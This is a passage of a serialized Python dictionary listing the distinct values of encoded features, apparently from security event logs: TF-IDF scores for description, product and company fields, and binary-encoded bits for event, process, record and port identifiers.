'0.4213046510973805', '0.0', '0.6787372301525905', '0.6586317016729233'], 'Description_tfidf_83': ['nan', '0.6828613867194314', '0.5215968087281899', '1', '0.6047721279392207', '0.0'], 'Description_tfidf_84': ['nan', '0.5372392188851637', '0.4034995586867435', '1', '0.5905881342185617', '0.0', '0.507248564491665'], 'Description_tfidf_85': ['nan', '0.5930194656161956', '0.7071067811865476', '0.6498401276660668', '0.6635889480072107', '0.5007584273769429', '1', '0.6271066946658312', '0.0'], 'Description_tfidf_86': ['0.4985310246431183', 'nan', '0.3997589528756219', '0.4606443381687834', '0.5770800505087426', '0.5615765688915337', '0.3763634801680944', '0.3208425606289203', '0.5466835095868391', '0.4166331401563571'], 'Description_tfidf_87': ['nan', '0.6201635816580106', '0.4159125744121961', '0.5796773541097503', '1', '0.0'], 'Description_tfidf_88': ['nan', '0.5122889331134168', '0.6746097299519618', '0.506602224475044', '0.5', '1', '0.0', '0.5530280768943723'], 'Description_tfidf_89': ['nan', '0', '0.4495971158087671', '1', '0.5340523951861901', '0.0', '0.4533388872077119', '0.6781230097748451'], 'Description_tfidf_90': ['nan', '0.5773502691896258', '0', '0.6655640130765897', '1.0', '0.883892872467676', '1', '0.552848616466464', '0.0', '0.6173739078370535'], 'Description_tfidf_91': ['nan', '0.4712105529179619', '0.4685189841181721', '0', '0.3820605126385363', '0.2535795730882987', '1', '0.3641659829558564', '0.0', '0.5734919468666645'], 'Description_tfidf_92': ['0.7193308261508712', 'nan', '0.5790004211609039', '0.9292781398050132', '0', '1', '0.0'], 'Description_tfidf_93': ['0.516861319352989', '0.470547661697783', 'nan', '0', '0.5504551341935163', '1', '0.6139196162938377', '0.0', '0.3603175086678624', '0.9373280701881782'], 'Description_tfidf_94': ['nan', '0.6763114612141804', '0', '0.253301112237522', '1', '0.0', '0.4213343693123426'], 'Description_tfidf_95': ['0.4871427449726066', 'nan', '0.5155219282881223', '0', '0.4884362457718121', '0.7009771553570072', '1', '0.5331593202655489', '0.0'], 'Description_tfidf_96': ['0.4514667673210695', 'nan', '0.3113765441408527', '0.3829878741610654', '0.5529286939288685', '0.7834556811658903', '0.4266443316178993', '0.4040353692789096', '0.332874019536151', '0.4005881863434113'], 'Description_tfidf_97': ['nan', '0.5773502691896258', '0', '0.5495734347865395', '1', '0.0', '0.5685686690457904'], 'Description_tfidf_98': ['0.4551322219436957', 'nan', '0.3210130924001801', '0.4253926454485611', '0.2417556032430733', '0.3159961460228203', '0.6823682344260206', '0.4377987569896518', '0.2865002629559808', '0.4801737067633056'], 'Description_tfidf_99': ['nan', '0.6022041804298619', '0', '0.8237990216724829', '1', '0.7490826892862888', '0.0', '0.7457705827679654'], 'Description_tfidf_100': ['nan', '0.4822366905221495', '0', '0.5004067981416687', '1', '0.493955708383491', '0.9236316972070432', '0.5272112390652299', '0.0', '0.5444549561813438'], 'Description_tfidf_101': ['nan', '0', '0.5994346163196572', '0.4628218403461832', '1', '0.4714953309243392', '0.6017449347590296', '0.0', '0.5546277066755011'], 'Description_tfidf_102': ['nan', '0.6554957811337759', '0', '0.4145398777332585', '0.5578183693511427', '1', '0.0', '0.533923221119257'], 'Description_tfidf_103': ['nan', '0.4145398777332585', '0', '1', '0.7162003164547865', '0.0', '0.6057780318131011'], 'Description_tfidf_104': ['nan', '0', '1', '0.6047721279392207', '0.0', '0.6108109928733585', '0.8974887267028947', '0.5238058098200384'], 'Description_tfidf_105': ['nan', '0.5362808260694585', '0', '0.520386532059638', '1', '0.0', '0.4994125558039584'], 'Description_tfidf_106': ['0.4860453877851432', 'nan', '0.5497924090077502', '0', '0.585107184780177', '0.491639460678223', '0.5026975319004563', '1', '0.0', '0.4509294478867579'], 'Description_tfidf_107': ['0.4689537839688009', 'nan', '0.5333125177423647', '0', '1.0', '0.4520802017952222', '0.49047611089514', '0.5830314343920114', '0.0'], 'Description_tfidf_108': ['nan', '0.7432246931373531', '0', '0.4674606259930389', '0.6562738315737734', '1', '0.0', '0.6427072189011547', '0.663248271563258'], 'Description_tfidf_109': ['nan', '0.379355531491973', '0.6303424875335336', '0', '0.5700744556109478', '0.5257275339754028', '0.4092041476032982', '1', '0.6499703376250551', '0.5853278581186502'], 'Description_tfidf_110': ['nan', '0.5183157819786135', '0', '0.4759509291613031', '0.6137770259134999', '0.5209741576808326', '1', '0.0'], 'Description_tfidf_111': ['nan', '0.4354879844132672', '0.3298554701727295', '0.4231473543333982', '0.2764483737242584', '0.4373885966531686', '0.4509521656128435', '0.4031987065495782', '0.2797883579279218', '0.4766450481588797'], 'Description_tfidf_112': ['nan', '0.3183040741849848', '0.2735138666128741', '0.3009835608163168', '0.3465265248470355', '0.3709024925683916', '0.3690985438852399', '0.3663046829919407', '0.3362149757594967', '0.5047168256152285'], 'Description_tfidf_113': ['nan', '0', '1.0', '1', '0.0', '0.6199438873140677', '0.8332485310519785'], 'Description_tfidf_114': ['nan', '0.5418702197942611', '0.588774389269018', '1', '0.5557148073311955', '0.0', '0.466504263116188'], 'Description_tfidf_115': ['nan', '0.4489975656324425', '0.5515110139471893', '0.4720213393260649', '0', '0.6783121402194421', '0.4450526386097449', '1', '0.0'], 'Description_tfidf_116': ['nan', '0.4159125744121961', '0', '0.6540250638656032', '1', '0.6476715491899186', '0.0'], 'Description_tfidf_117': ['nan', '0', '0.6118468147438618', '1', '0.5047168256152285', '0.0', '0.6889288525283793', '0.418616582662108'], 'Description_tfidf_118': ['nan', '0.5362808260694585', '0', '1', '0.6749221599828176', '0.0', '0.9263478819632962'], 'Description_tfidf_119': ['nan', '0.5197646144677307', '0.4654883933303357', '0.4196904244673095', '1', '0.0', '0.4547796386993037'], 'Description_tfidf_120': ['0.6621409752377521', 'nan', '0.7095174554321941', '0', '0.651690050783449', '0.5502919487880338', '1', '0.0'], 'Description_tfidf_121': ['nan', '0.5594357735555924', '0.681671060875277', '0.5571376833421978', '0', '0.4861505019708083', '0.4811116986056604', '0.5243879277391507', '1', '0.625981217324815'], 'Description_tfidf_122': ['0.5029436257964515', 'nan', '0', '0.5411133881605372', '0.6996554801709615', '1', '0.0', '0.5698482991772355', '0.8952474182498285', '0.5372665547940484'], 'Description_tfidf_123': ['0.662477498438109', 'nan', '0.5215280328944654', '0', '0.5079126432016501', '0.3601580014638779', '1', '0.0', '0.7866698531925609', '0.4374131680940927'], 'Description_tfidf_124': ['0.3057432139061377', 'nan', '0.8187401509501219', '0.7314666091756619', '0.4170822661243193', '0', '0.2921101794974576', '0.4153114636699185', '1', '0.4560431548952539'], 'Description_tfidf_125': ['nan', '0', '0.4948868510490299', '0.5578183693511427', '0.7006421684393376', '0.654666502127111', '1', '0.0'], 'Description_tfidf_126': ['nan', '0.4422626053926241', '0', '0.3428342894616185', '0.253301112237522', '0.2535795730882987', '1', '0.4228312786914046', '0.0'], 'Description_tfidf_127': ['nan', '0.5084803400646272', '0', '0.6365951057746507', '1', '0.655440866011633', '0.0', '0.3399337282409029'], 'Description_tfidf_128': ['0.5470220627519693', '0.4585636484583267', 'nan', '0', '1', '0.8375095381906951', '0.0', '0.5062706955749297', '0.4432186059705306'], 'Description_tfidf_129': ['nan', '0', '0.3752798494116078', '0.253301112237522', '0.2535795730882987', '1', '0.0'], 'Description_tfidf_130': ['nan', '0', '0.696555754681794', '0.6828227016637225', '0.6608997677082138', '0.4603351127352278', '1', '0.4287310431654141', '0.0', '0.5216917813268229'], 'Description_tfidf_131': ['nan', '0.604621130633912', '0', '0.6607887774416801', '0.6369825889206124', '1', '0.5767266933614295', '0.49522611212143', '0.0', '0.5604683739280016'], 'Description_tfidf_132': ['0.5039519775169768', 'nan', '0.4482785955241766', '0', '0.5458968702046357', '0.3864174660405167', '0.4587327654268363', '0.5257028464917556', '0.4276102194760313', '1'], 'Description_tfidf_133': ['0.662477498438109', 'nan', '0', '0.8378523778690272', '1', '0.0', '0.6648733841720318'], 'Description_tfidf_134': ['nan', '0', '0.4654883933303357', '0.612911045873575', '0.515075549952005', '1', '0.6742667918409633', '0.0'], 'Description_tfidf_135': ['nan', '0.7268564467352577', '0', '0.5406438680560445', '0.439934567608808', '1', '0.7057256849340708', '0.0', '0.4004874926484366', '0.5025300536121647'], 'Description_tfidf_136': ['0.519700380844155', 'nan', '0.7828748398539183', '0.372386482745387', '0', '0.6646489058924671', '1', '0.0', '0.4951601927854495', '0.6687934259534232'], 'Description_tfidf_137': ['nan', '0.7094133472934444', '0', '1', '0.5773502691896257', '0.0', '0.4219339103145202', '0.6456206755134697'], 'Description_tfidf_138': ['0.6106443270448328', 'nan', '0.7050066768531844', '0.5608037171250414', '0', '0.6542591754563409', '0.5421908281334084', '1', '0.4916970111100161', '0.0'], 'Description_tfidf_139': ['nan', '0.6212171112599644', '0.4461587782442336', '0.4416526807721084', '0', '1', '0.0', '0.542812712028527', '0.5990185845595201'], 'Description_tfidf_140': ['nan', '0.5195780317930575', '0.757526431484054', '0', '0.5417931498592425', '1', '0.5343550150249775', '0.0', '0.637629183834905'], 'Description_tfidf_141': ['nan', '0.5420247409139809', '0', '0.4313539102445701', '0.395182531110744', '1', '0.5608187951228312', '0.7267610029489184', '0.0', '0.4829062585875363'], 'Description_tfidf_142': ['nan', '0.4869953351774719', '0.6726363158130861', '0.4275525890772567', '0.527266075288422', '0.4254361994035965', '0.5464227058236221', '0.4026886000595908', '0.3662131405556519', '0.4680033445223947'], 'Description_tfidf_143': ['0.4473404165301243', '0.5865689786111931', 'nan', '0.5171332735459484', '0.5960770238061994', '0.3430346400996394', '0', '0.5685245954670863', '0.6571051969132076', '0.3640135696731378'], 'Description_tfidf_144': ['nan', '0', '0.6439264174656747', '0.4152948052745288', '0.2535795730882987', '1', '0.0'], 'Description_tfidf_145': ['nan', '0.4350282331947164', '0.6926035869840521', '0', '1', '0.5449319319215461', '0.4543671451018019', '0.0', '0.6369155883014778'], 'Description_tfidf_146': ['nan', '0.4603918027656825', '0.3616781977755499', '0.3045461373608649', '0.292066784513647', '0.4011302833716393', '0.2278727231366678', '0.4092288384702933', '0.2293199751000225', '0.4856377436160225'], 'Description_tfidf_147': ['0.3752421366619351', 'nan', '0.4814489787458587', '0.6631973455303195', '0', '0.7046878602878186', '0.4322708038302678', '0.4877715119423434', '1', '0.4342828964068199'], 'Description_tfidf_148': ['0.4496313647552313', 'nan', '0.3594371095764468', '0.5839913252718264', '0.4487672943756808', '0', '1.0', '0.4883893643896363', '0.6026667802367994', '0.5089173846557914'], 'Description_tfidf_149': ['nan', '0.8271620749173241', '0', '0.6087817024078216', '0.253301112237522', '1', '0.6100238756893038', '0.0', '0.6434685374744034'], 'Description_tfidf_150': ['nan', '0.4600210314893848', '0.381096916783923', '0.2643353178685718', '0.2776458008356374', '0.3090867768611889', '0.3363875489640106', '0.4685363681553801', '0.3566275827071849', '0.362475598551166'], 'Description_tfidf_151': ['nan', '0.6115702134910925', '0.3597229046297981', '0.5782940874564725', '0.3294707566741875', '0.3620251971355322', '0', '0.4837208131658541', '0.5696084760730677', '1.0'], 'Description_tfidf_152': ['nan', '0', '0.8871642056858166', '0.6463853345076643', '0.7794054010623436', '1', '0.0', '0.5414805695480968'], 'Description_tfidf_153': ['0.5384095243074842', 'nan', '0', '0.4283612262682368', '0.3752798494116078', '1', '0.5809543466505298', '0.0', '0.4574601815285485'], 'Description_tfidf_154': ['0.5377059719641689', 'nan', '0.6491496126799701', '0', '0.6727887902754599', '0.0'], 'Description_tfidf_155': ['0.5747716856548464', 'nan', '0.7564879936013067', '0.4811116986056604', '1', '0.0', '0.5521049603939315'], 'Description_tfidf_156': ['nan', '0.5272579156190573', '0.5131861378434313', '0.6766681356210765', '1', '0.0', '0.5617601587153284'], 'Description_tfidf_157': ['nan', '0.5240816972558455', '0', '0.4880842598538999', '0.6233718500400733', '0.4917861493259065', '0.5872481617436783', '0.3425236651665537', '0.0', '0.6411478921620187'], 'Description_tfidf_158': ['nan', '0.5958537951376588', '0', '1.0', '0.5837530937618371', '0.0'], 'Description_tfidf_159': ['nan', '0.7600709233189691', '0.6672703132638957', '0', '0.0', '0.5100704887358115'], 'Description_tfidf_160': ['nan', '0.7480973921106018', '0', '0.5918383391459604', '0.4152951508051375', '0.0', '0.4214067553059122'], 'Description_tfidf_161': ['nan', '0.915112453765518', '0.5171611536333274', '0.4901374895274812', '0.4521120208223558', '0', '0.5458000068647507', '0.5283593528531839', '0.0'], 'Description_tfidf_162': ['nan', '0.5958537951376588', '0.4517748375546952', '0.7138253450272691', '0.4869422616839627', '0', '0.393032546369171', '0.5119857575653185', '0.5986811967875456', '0.0'], 'Description_tfidf_163': ['nan', '0.8462467416556947', '0.5206849388850623', '0.588072366672091', '0', '0.7695253234389908', '0.451883837140878', '0.3886854707338483', '0.0'], 'Description_tfidf_164': ['nan', '0.6018175564242267', '0.5197646144677307', '1', '0.7071067811865475', '0.0', '0.652804492633924'], 'Description_tfidf_165': ['0.6381182262071552', 'nan', '1.0', '0.5310238326782559', '0.550635769985682', '1', '0.0'], 'Description_tfidf_166': ['0.5573759765564846', 'nan', '0.4790319254223074', '0.646821235107373', '0.4474339342465525', '0.5950250189335003', '0.5292676627664524', '1', '0.0', '0.6221792226711703'], 'Description_tfidf_167': ['nan', '0.4639846575912259', '0.4318376368820039', '0.4824439723177599', '0.5403755079794273', '0.7434233603271174', '0.9235457682180632', '0.4671113394360779', '1.0', '1'], 'Description_tfidf_168': ['nan', '0.6657755823203853', '0.511799211403992', '0.9160210127296144', '1', '0.0', '0.7523449979288711', '0.651602405178708', '0.6675557248856938', '0.6951434938131509'], 'Description_tfidf_169': ['nan', '0.5976061977137549', '1', '0.8741482269929389', '0.0', '0.4219339103145202'], 'Description_tfidf_170': ['nan', '0.4177695708665724', '0.5773502691896258', '0.4183126309382307', '0.5502919487880338', '1', '0.0'], 'Description_tfidf_171': ['nan', '0.8877158261212678', '0', '1.0', '0.6236224243048453', '1', '0.0', '0.6333329455891463', '0.44216897416315'], 'Description_tfidf_172': ['nan', '0.4815075347693968', '0', '0.8973597084698413', '0.4813378729927731', '1', '0.6029450463070046', '0.0', '0.4213343693123426'], 'Description_tfidf_173': ['nan', '0.6996146344691101', '0.7836385012732752', '0.4819674723169783', '0', '1', '0.0', '0.4213343693123426'], 'Description_tfidf_174': ['0.6753334408527002', 'nan', '0', '0.770933546668312', '0.2535795730882987', '1', '0.7107032238208265', '0.0'], 'Description_tfidf_175': ['nan', '0', '0.3752798494116078', '0.253301112237522', '0.5', '1', '0.0'], 'Description_tfidf_176': ['0.4270335176652616', 'nan', '0.5231602988743058', '0', '0.4451671679326945', '0.5926823067668152', '0.3238112900212232', '1', '0.0', '0.6283168985169216'], 'Description_tfidf_177': ['nan', '0.518007622807605', '0', '0.6821676618135762', '1', '0.0', '0.5906701955420494'], 'Description_tfidf_178': ['nan', '0.4877081095691946', '0.5272579156190573', '0', '1', '0.0', '0.5100704887358115'], 'Description_tfidf_179': ['nan', '0.5056942464614264', '0', '0.4902937255630866', '0.6177835765569418', '0.6958076552252636', '1', '0.7071067811865475', '0.0', '0.6157026503466908'], 'Description_tfidf_180': ['nan', '0', '0.4942077061304762', '0.5918383391459604', '0.464971926014355', '1', '0.0', '0.4359098230287983'], 'Description_tfidf_181': ['nan', '0.8934167118823836', '0', '1', '0.5202904054360185', '0.0', '0.4490824512751361', '0.6648733841720318', '0.6687934259534232'], 'Description_tfidf_182': ['nan', '0', '0.5192869060137021', '0.6401459498982549', '0.5773502691896257', '1', '0.0'], 'Description_tfidf_183': ['nan', '0.5211977842249752', '0.6077697690585501', '0.5645166331436621', '0', '0.3879264740645474', '0.4603351127352278', '1', '0.0'], 'Description_tfidf_184': ['nan', '0.6205877295939102', '0.931152519589867', '0', '0.516906304604206', '1', '0.3751418324037109', '0.5256809690795877', '0.0'], 'Description_tfidf_185': ['nan', '0', '0.654472119912157', '1', '0.0', '0.4994125558039584', '0.6222542259769609'], 'Description_tfidf_186': ['nan', '0.7387320591654515', '0', '0.8905351435578754', '0.5570902663573792', '1', '0.0'], 'Description_tfidf_187': ['nan', '0', '1.0', '0.682383941696141', '0.5', '1', '0.0'], 'Description_tfidf_188': ['nan', '0', '0.4833368933821587', '0.3844786103479002', '0.4272372419711173', '0.3017696137978412', '0.5056089537831611', '0.6611497477766993', '1', '0.5333663428941323'], 'Description_tfidf_189': ['0.2338845027839987', 'nan', '0.4645058509207245', '0.3618890488184624', '0.4603351127352278', '0.294868955444193', '0.3872010642453069', '0.3852294639822507', '0.4442978192087301', '0.3376536142101319'], 'Description_tfidf_190': ['nan', '0', '1.0', '0.4525940507609635', '0.5740357345941031', '1', '0.5284898169914296', '0.0', '0.5726677311186987'], 'Description_tfidf_191': ['nan', '0.6309428492362296', '0', '0.5355433714440786', '1', '0.0', '0.5097631239512483'], 'Description_tfidf_192': ['0.7543457281173299', 'nan', '0.4159125744121961', '0', '1', '0.0', '0.7181318044779679'], 'Description_tfidf_193': ['0.7952928519566734', 'nan', '0.4527483598977013', '0', '0.6176380518781285', '0.2535795730882987', '0.6328225682497246', '1', '0.0'], 'Description_tfidf_194': ['0.4455693662237305', '0.4691584056086733', '0.3868461377672407', '0.2454925584919829', 'nan', '0.5900070389347402', '0.349638567847385', '0.2433356420585896', '0.4290674144907213', '0.2222557153458709'], 'Description_tfidf_195': ['nan', '0.637284354632601', '0', '0.253301112237522', '0.3878886775347828', '1', '0.2524085372361218', '0.0', '0.6331762045660784', '0.3488674598536331'], 'Description_tfidf_196': ['nan', '0.4808176177221869', '0', '0.4930356278437486', '0.5801166313093453', '0.4298179978393257', '0.4066065263860343', '1', '0.0', '0.5097631239512483'], 'Description_tfidf_197': ['nan', '0.5612100353330018', '0.5515110139471893', '0', '0.5688393702594567', '1', '0.0'], 'Product_tfidf_0': ['0.6696245304085927', 'nan', '0.4472135954999579', '0.676276702661414', '0', '1', '0.0'], 'Product_tfidf_1': ['0.4472135954999579', 'nan', '0.6278080604718204', '0', '0.5625032670004123', '1', '0.0'], 'Product_tfidf_2': ['0.4472135954999579', 'nan', '0', '1', '0.5773502691896257', '0.0', '0.4555894085205829'], 'Product_tfidf_3': ['nan', '0', '1', '0.5773502691896257', '0.0', '0.4555894085205829'], 'Product_tfidf_4': ['0.6808088232789354', 'nan', '0.7071067811865476', '0', '1', '0.0', '0.4555894085205829'], 'Product_tfidf_5': ['nan', '0', '0.4120111204512101', '0.6074670956341428', '1', '0.6895952397489459', '0.5773502691896257', '0.0'], 'Product_tfidf_6': ['nan', '0.4652335315796852', '0.6735742632372417', '0', '0.7275363068857709', '0.4082193878869893', '0.6805160746571647', '1', '0.5428455378645036', '0.0'], 'Product_tfidf_7': ['0.4472135954999579', 'nan', '0.5048591735206234', '0.4596411632288877', '0', '1', '0.0'], 'Product_tfidf_8': ['nan', '0', '0.7241950050335847', '0.6073792273034763', '1', '0.0', '0.62456883780533'], 'Product_tfidf_9': ['nan', '0.5048591735206234', '0.4596411632288877', '0', '1', '0.0', '0.4555894085205829'], 'Product_tfidf_10': ['nan', '0.7255261844908608', '0.5420090005811978', '0.4078632865570642', '0.4596411632288877', '0', '1', '0.4647066221025565', '0.0', '0.5956715067416586'], 'Product_tfidf_11': ['0.625373250653922', 'nan', '0', '0.3935987859005408', '0.6995723921917241', '0.6073792273034763', '1', '0.5388421959277544', '0.0'], 'Product_tfidf_12': ['0.6778613810200079', 'nan', '0', '0.693346394630754', '0.3042949618524994', '1', '0.0', '0.4994729413164604'], 'Product_tfidf_13': ['nan', '0', '1', '0.5773502691896257', '0.7497754024698489', '0.0'], 'Product_tfidf_14': ['0.6616924103019288', 'nan', '0', '1.0', '1', '0.7071067811865475', '0.0'], 'Product_tfidf_15': ['0.4472135954999579', 'nan', '0.6735742632372417', '0', '1', '0.0'], 'Product_tfidf_16': ['nan', '0', '0.2895934475415196', '0.5773502691896257', '1', '0.0', '0.4998551942761082'], 'Product_tfidf_17': ['nan', '0.6278080604718204', '0', '0.767950006435296', '0.5731063630175307', '0.5556896691752831', '1', '0.0', '0.768820749646402'], 'Product_tfidf_18': ['0.4472135954999579', 'nan', '0', '1.0', '0.7145617314712207', '1', '0.0'], 'Product_tfidf_19': ['nan', '0.4649549654262759', '0.4596411632288877', '0', '0.5', '1', '0.0', '0.5956715067416586'], 'Product_tfidf_20': ['0.7475770783716089', 'nan', '0', '0.6572413780113505', '0.5', '1', '0.0', '0.4596579412722459'], 'Product_tfidf_21': ['nan', '0.2716537212452808', '0.6881945623282221', '0.4407953527319232', '0.2004867044982227', '0.6539270199483892', '0.4598260357371421', '0.5141201722370548', '0', '0.6641750611799343'], 'Product_tfidf_22': ['nan', '0.4940264215344373', '0.5119051660525625', '0.3804719505598778', '0.4577035342400719', '0.3024811467208944', '0.5742183632153689', '0.1970446051540914', '0.686069181761587', '0.4462603285931668'], 'Product_tfidf_23': ['0.2333457467517262', 'nan', '0.2846188613625168', '0.498885462967459', '0', '1.0', '0.2895934475415196', '1', '0.0', '0.4998551942761082'], 'Product_tfidf_24': ['0.4472135954999579', 'nan', '0', '0.693346394630754', '0.7435742601194639', '1', '0.0'], 'Product_tfidf_25': ['0.4472135954999579', 'nan', '0.5120360812291107', '0', '1.0', '0.903795891361894', '0.6489326840700566', '1', '0.0', '0.6686533628778006'], 'Product_tfidf_26': ['0.6778613810200079', 'nan', '0', '0.6642134955333121', '0.8171156470916813', '0.4601239815671665', '1', '0.0'], 'Product_tfidf_27': ['0.5120360812291107', 'nan', '0.6425494803045989', '0', '1.0', '1', '0.5773502691896257', '0.0', '0.500815685060953', '0.9047617756714385'], 'Company_tfidf_0': ['0.4472135954999579', 'nan', '0', '0.4508720695764156', '0.5773502691896257', '1', '0.0'], 'Company_tfidf_1': ['nan', '0.4185943948905487', '0', '1', '0.7071067811865475', '0.0'], 'Company_tfidf_2': ['0.4472135954999579', 'nan', '0.9529886113214648', '0', '0.4508720695764156', '1', '0.0'], 'Company_tfidf_3': ['nan', '0', '0.7064405684295858', '0.397357469223178', '1', '0.0', '0.5832519251516252'], 'Company_tfidf_4': ['nan', '0.5773502691896258', '0', '0.5773502691896257', '1', '0.0'], 'Company_tfidf_5': ['nan', '0.7071067811865476', '0', '0.4275793778795598', '1', '0.4082482904638629', '0.0'], 'Company_tfidf_6': ['nan', '0.9517975456635404', '0.9711925250760488', '0', '0.5773502691896257', '1', '0.0'], 'Company_tfidf_7': ['nan', '0.7069159054596434', '0.7071067811865476', '0.7121223109057163', '0', '1', '0.0', '0.3757451082285126'], 'Company_tfidf_8': ['0.7077723668503056', 'nan', '0', '0.3030061165910455', '0.5', '0.5773502691896257', '1', '0.0'], 'Company_tfidf_9': ['nan', '0.5773502691896258', '0', '0.5743767020897188', '0.5348882388663887', '1', '0.0', '0.9176639045165452'], 'Company_tfidf_10': ['nan', '0', '1.0', '0.5743767020897188', '0.5348882388663887', '1', '0.7071067811865475', '0.0', '0.80595127962702'], 'Company_tfidf_11': ['nan', '0.5773502691896258', '0.4185943948905487', '0', '1', '0.5773502691896257', '0.0'], 'EventID_binary_0': ['0', 'nan', '1'], 'EventID_binary_1': ['0', 'nan', '1'], 'EventID_binary_2': ['0', 'nan', '1'], 'EventID_binary_3': ['0', 'nan', '1'], 'EventID_binary_4': ['0', 'nan', '1'], 'EventID_binary_5': ['0', 'nan', '1'], 'EventID_binary_6': ['0', 'nan', '1'], 'EventID_binary_7': ['0', 'nan', '1'], 'EventID_binary_8': ['0', 'nan', '1'], 'EventID_binary_9': ['0', 'nan', '1'], 'EventID_binary_10': ['0', 'nan', '1'], 'EventID_binary_11': ['0', 'nan', '1'], 'EventID_binary_12': ['0', 'nan', '1'], 'EventID_binary_13': ['0', 'nan', '1'], 'EventID_binary_14': ['0', 'nan', '1'], 'EventID_binary_15': ['0', 'nan', '1'], 'ProcessID_binary_0': ['0', 'nan', '1'], 'ProcessID_binary_1': ['0', 'nan', '1'], 'ProcessID_binary_2': ['0', 'nan', '1'], 'ProcessID_binary_3': ['0', 'nan', '1'], 'ProcessID_binary_4': ['0', 'nan', '1'], 'ProcessID_binary_5': ['0', 'nan', '1'], 'ProcessID_binary_6': ['0', 'nan', '1'], 'ProcessID_binary_7': ['0', 'nan', '1'], 'ProcessID_binary_8': ['0', 'nan', '1'], 'ProcessID_binary_9': ['0', 'nan', '1'], 'ProcessID_binary_10': ['0', 'nan', '1'], 'ProcessID_binary_11': ['0', 'nan', '1'], 'ProcessID_binary_12': ['0', 'nan', '1'], 'ProcessID_binary_13': ['0', 'nan', '1'], 'ProcessID_binary_14': ['0', 'nan', '1'], 'ProcessID_binary_15': ['0', 'nan', '1'], 'Execution_ProcessID_binary_0': ['0', 'nan', '1'], 'Execution_ProcessID_binary_1': ['0', 'nan', '1'], 'Execution_ProcessID_binary_2': ['0', 'nan', '1'], 'Execution_ProcessID_binary_3': ['0', 'nan', '1'], 'Execution_ProcessID_binary_4': ['0', 'nan', '1'], 'Execution_ProcessID_binary_5': ['0', 'nan', '1'], 'Execution_ProcessID_binary_6': ['0', 'nan', '1'], 'Execution_ProcessID_binary_7': ['0', 'nan', '1'], 'Execution_ProcessID_binary_8': ['0', 'nan', '1'], 'Execution_ProcessID_binary_9': ['0', 'nan', '1'], 'Execution_ProcessID_binary_10': ['0', 'nan', '1'], 'Execution_ProcessID_binary_11': ['0', 'nan', '1'], 'Execution_ProcessID_binary_12': ['0', 'nan', '1'], 'Execution_ProcessID_binary_13': ['0', 'nan', '1'], 'Execution_ProcessID_binary_14': ['0', 'nan', '1'], 'Execution_ProcessID_binary_15': ['0', 'nan', '1'], 'ParentProcessId_binary_0': ['0', 'nan', '1'], 'ParentProcessId_binary_1': ['0', 'nan', '1'], 'ParentProcessId_binary_2': ['0', 'nan', '1'], 'ParentProcessId_binary_3': ['0', 'nan', '1'], 'ParentProcessId_binary_4': ['0', 'nan', '1'], 'ParentProcessId_binary_5': ['0', 'nan', '1'], 'ParentProcessId_binary_6': ['0', 'nan', '1'], 'ParentProcessId_binary_7': ['0', 'nan', '1'], 'ParentProcessId_binary_8': ['0', 'nan', '1'], 'ParentProcessId_binary_9': ['0', 'nan', '1'], 'ParentProcessId_binary_10': ['0', 'nan', '1'], 'ParentProcessId_binary_11': ['0', 'nan', '1'], 'ParentProcessId_binary_12': ['0', 'nan', '1'], 'ParentProcessId_binary_13': ['0', 'nan', '1'], 'ParentProcessId_binary_14': ['0', 'nan', '1'], 'ParentProcessId_binary_15': ['0', 'nan', '1'], 'TargetProcessId_binary_0': ['nan', '0', '1'], 'TargetProcessId_binary_1': ['nan', '0', '1'], 'TargetProcessId_binary_2': ['0', 'nan', '1'], 'TargetProcessId_binary_3': ['0', 'nan', '1'], 'TargetProcessId_binary_4': ['0', 'nan', '1'], 'TargetProcessId_binary_5': ['0', 'nan', '1'], 'TargetProcessId_binary_6': ['0', 'nan', '1'], 'TargetProcessId_binary_7': ['0', 'nan', '1'], 'TargetProcessId_binary_8': ['0', 'nan', '1'], 'TargetProcessId_binary_9': ['nan', '0', '1'], 'TargetProcessId_binary_10': ['nan', '0', '1'], 'TargetProcessId_binary_11': ['nan', '0', '1'], 'TargetProcessId_binary_12': ['nan', '0', '1'], 'TargetProcessId_binary_13': ['nan', '0', '1'], 'TargetProcessId_binary_14': ['nan', '0', '1'], 'TargetProcessId_binary_15': ['nan', '0', '1'], 'EventRecordID_binary_0': ['0', 'nan', '1'], 'EventRecordID_binary_1': ['0', 'nan', '1'], 'EventRecordID_binary_2': ['0', 'nan', '1'], 'EventRecordID_binary_3': ['0', 'nan', '1'], 'EventRecordID_binary_4': ['0', 'nan', '1'], 'EventRecordID_binary_5': ['0', 'nan', '1'], 'EventRecordID_binary_6': ['0', 'nan', '1'], 'EventRecordID_binary_7': ['0', 'nan', '1'], 'EventRecordID_binary_8': ['0', 'nan', '1'], 'EventRecordID_binary_9': ['0', 'nan', '1'], 'EventRecordID_binary_10': ['0', 'nan', '1'], 'EventRecordID_binary_11': ['0', 'nan', '1'], 'EventRecordID_binary_12': ['0', 'nan', '1'], 'EventRecordID_binary_13': ['0', 'nan', '1'], 'EventRecordID_binary_14': ['0', 'nan', '1'], 'EventRecordID_binary_15': ['0', 'nan', '1'], 'SourcePort_binary_0': ['0', 'nan', '1'], 'SourcePort_binary_1': ['0', 'nan', '1'], 'SourcePort_binary_2': ['0', 'nan', '1'], 'SourcePort_binary_3': ['0', 'nan', '1'], 'SourcePort_binary_4': ['0', 'nan', '1'], 'SourcePort_binary_5': ['0', 'nan', '1'], 'SourcePort_binary_6': ['0', 'nan', '1'], 'SourcePort_binary_7': ['0', 'nan', '1'], 'SourcePort_binary_8': ['0', 'nan', '1'], 'SourcePort_binary_9': ['0', 'nan', '1'], 'SourcePort_binary_10': ['0', 'nan', '1'], 'SourcePort_binary_11': ['0', 'nan', '1'], 'SourcePort_binary_12': ['0', 'nan', '1'], 'SourcePort_binary_13': ['0', 'nan', '1'], 'SourcePort_binary_14': ['0', 'nan', '1'], 'SourcePort_binary_15': ['0', 'nan', '1'], 'DestinationPort_binary_0': ['0', 'nan', '1'], 'DestinationPort_binary_1': ['0', 'nan', '1'], 'DestinationPort_binary_2': ['0', 'nan', '1'], 'DestinationPort_binary_3': ['0', 'nan', '1'], 'DestinationPort_binary_4': ['0', 'nan', '1'], 'DestinationPort_binary_5': ['0', 'nan', '1'], 'DestinationPort_binary_6': ['0', 'nan', '1'], 'DestinationPort_binary_7': ['0', 'nan', '1'], 'DestinationPort_binary_8': ['0', 'nan', '1'], 'DestinationPort_binary_9': ['0', 'nan', '1'], 'DestinationPort_binary_10': ['0', 'nan', '1'], 'DestinationPort_binary_11': ['0', 'nan', '1'], 'DestinationPort_binary_12': ['0', 'nan', '1'], 'DestinationPort_binary_13': ['0', 'nan', '1'], 'DestinationPort_binary_14': ['0', 'nan', '1'], 